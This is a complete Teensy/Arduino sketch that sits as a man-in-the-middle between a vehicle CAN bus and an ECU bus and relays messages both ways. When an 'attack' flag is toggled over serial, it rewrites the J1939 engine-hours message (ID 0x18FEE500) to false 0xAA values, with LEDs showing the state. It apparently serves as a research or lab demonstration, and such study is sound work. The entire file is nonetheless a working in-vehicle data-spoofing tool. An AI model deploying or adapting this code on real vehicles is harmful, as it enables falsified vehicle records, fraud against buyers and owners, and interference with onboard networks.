#include <FlexCAN_T4.h>

FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_1024> vehicle_can;
FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_1024> ecu_can;

#define RED_LED    3
#define GREEN_LED  2
#define YELLOW_LED 4
#define AMBER_LED  5 

boolean RED_LED_state;
boolean GREEN_LED_state;
boolean YELLOW_LED_state;
boolean AMBER_LED_state;

boolean attack_state;

uint32_t vehicle_rx_count;
uint32_t ecu_rx_count;

void setup() {

  // put your setup code here, to run once:
  pinMode(RED_LED,OUTPUT);
  pinMode(GREEN_LED,OUTPUT);
  pinMode(YELLOW_LED,OUTPUT);
  pinMode(AMBER_LED,OUTPUT);
  pinMode(LED_BUILTIN,OUTPUT);
  RED_LED_state = true;
  GREEN_LED_state = true;
  YELLOW_LED_state = true;
  AMBER_LED_state = true;

  vehicle_can.begin();
  vehicle_can.setBaudRate(250000);
  vehicle_can.setMaxMB(32);
  
  
  ecu_can.begin();
  ecu_can.setBaudRate(250000);
  ecu_can.setMaxMB(32);
   
  vehicle_can.enableFIFO();
  vehicle_can.enableFIFOInterrupt();
  vehicle_can.onReceive(rx_vehicle_msg);
  
  ecu_can.enableFIFO();
  ecu_can.enableFIFOInterrupt();
  ecu_can.onReceive(rx_ecu_can);
}

void rx_vehicle_msg(const CAN_message_t &msg){
  vehicle_rx_count++;
  AMBER_LED_state = !AMBER_LED_state;
  
  ecu_can.write(msg);
}

void rx_ecu_can(CAN_message_t &msg){
  if (attack_state){
    if (msg.id == 0x18FEE500){// Engine hours from engine #1
      msg.buf[0]=0xAA;
      msg.buf[1]=0xAA;
      msg.buf[2]=0xAA;
      msg.buf[3]=0xAA;
    }
  }
  ecu_rx_count++;
  YELLOW_LED_state = !YELLOW_LED_state;
  vehicle_can.write(msg);
}

void loop() {
  vehicle_can.events();
  ecu_can.events();

  if (Serial.available()){
    char c = Serial.read();
    while(Serial.read() > 0);
    attack_state = !attack_state;
    Serial.write(c);
  }
  RED_LED_state = attack_state;
  
  digitalWrite(RED_LED,RED_LED_state);
  digitalWrite(GREEN_LED,GREEN_LED_state);
  digitalWrite(YELLOW_LED,YELLOW_LED_state);
  digitalWrite(AMBER_LED,AMBER_LED_state);
}
